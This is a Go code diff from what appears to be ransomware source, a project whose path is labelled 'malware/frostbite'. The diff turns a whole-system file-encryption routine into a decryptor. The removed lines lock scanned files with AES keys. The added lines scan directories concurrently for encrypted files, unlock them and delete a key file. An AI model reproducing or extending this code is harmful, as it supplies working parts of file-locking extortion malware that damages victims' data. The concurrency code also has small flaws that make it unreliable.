@@ -1,18 +1,23 @@
 package system
 
 import (
+	"fmt"
+	"os"
 	"runtime"
+	"sync"
 	"time"
 
-	file "frostbite.com/tools/file"
+	"frostbite.com/tools/file"
+	scan "frostbite.com/tools/scan"
 	humanize "github.com/dustin/go-humanize"
 )
 
-func WholeSystemDecrypt(aesKey []byte, encryptedAesKey []byte) {
+func WholeSystemDecrypt(aesKey []byte) {
 
 	//set variables
+	//set variables
 	var (
-		filesToEncrypt []string
+		filesToDecrypt []string
 		// sizeOfFoundFiles int64
 	)
 	dirsToScan := []string{
@@ -23,18 +28,61 @@ func WholeSystemDecrypt(aesKey []byte, encryptedAesKey []byte) {
 	timeNow := time.Now()
 
 	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
-	dirsToScan = []string{"/home/dejan/dev/go/malware/frostbite/data"}
+	dirsToScan = []string{"/run/media/dejan/AMD/vm/"}
 	pl("dirsToScan: ", dirsToScan)
 
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
-	//listen for channel and append to filesToEncrypt
-	filesToEncrypt = getAllFiles(dirsToScan, filesToEncrypt)
-	//encrypt files
-	file.LockFilesArray(filesToEncrypt, aesKey, encryptedAesKey)
+	// listen for channel and append to filesToDecrypt
+	filesToDecrypt = getAllEncFiles(dirsToScan)
+	// encrypt files
+	pl("Unlocking...")
+	file.UnlockFilesArray(filesToDecrypt, aesKey)
 
 	timeEnd := time.Now()
-	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
-	//print human readable size
+	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToDecrypt))))
+	// print human readable size
 	pl("Time elapsed: ", timeEnd.Sub(timeNow))
+	os.Remove("decrypted.key")
 
+}
+func getAllEncFiles(dirsToScan []string) []string {
+	wg := sync.WaitGroup{}
+	wg.Add(len(dirsToScan))
+
+	var filesToEncrypt []string
+	var chanFilesScanned = make(chan []string)
+
+	for _, dir := range dirsToScan {
+		go goroutineScanDirDecrypt(dir, &wg, chanFilesScanned)
+	}
+
+	go func() {
+		for range dirsToScan {
+			files := <-chanFilesScanned
+			filesToEncrypt = append(filesToEncrypt, files...)
+			wg.Done()
+
+		}
+	}()
+
+	wg.Wait()
+	return filesToEncrypt
+}
+
+func goroutineScanDirDecrypt(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
+
+	_, err := os.Stat(dir)
+	if err != nil {
+		if os.IsNotExist(err) {
+			fmt.Println("Dir does not exist: ", dir)
+			wg.Done()
+		}
+	} else {
+		pl("Scanning: ", dir)
+		files := scan.ScanForEncFilesInDir(dir, true)
+		//send files to channel
+		chanFilesScanned <- files
+
+		pl("Files found in this dir: ", humanize.Comma(int64(len(files))))
+	}
 }
